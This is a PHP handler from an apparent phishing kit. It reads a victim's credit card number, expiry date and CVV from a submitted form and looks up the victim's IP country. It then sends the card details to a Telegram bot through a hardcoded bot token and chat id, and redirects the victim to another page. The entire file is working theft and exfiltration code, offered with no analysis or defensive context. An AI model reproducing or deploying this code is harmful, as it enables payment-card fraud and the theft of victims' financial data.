<?php
session_start();

$cc=$_POST["cc"];
$date=$_POST["date"];
$cvv=$_POST["cvv"];
$rand=rand(1000000,999999999).rand(1000000,999999999);


        $_SESSION['cc'] = $cc;
        $_SESSION['date'] = $date;
        $_SESSION['cvv'] = $cvv;
		
        

    function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  
$iptolocation = 'http://api.hostip.info/country.php?ip=' . $ip;
$blad = file_get_contents($iptolocation);
$t=time();
$w9t = date("h:i:sa");
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|CC  PT |----------|\n";
$message .= "Credit Card  : ".$_SESSION['cc']."\n";
$message .= "Exp Date    : ".$_SESSION['date']."\n";
$message .= "CVV    : ".$_SESSION['cvv']."\n";
$message .= "
----------- ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥----------------->
Victime IP: $ip | COUNTRY : $ipdat->geoplugin_countryName .
------------ ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥---------------->";

$token = "7216603666:AAHxvOD_-5evGiaW4GIa9uyG4-opdeV3Pu8";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-4205027125&text=" . urlencode($message)."" );
	
 header("location:load.php?vc?__event=card&service_id=top_card=IL")
?>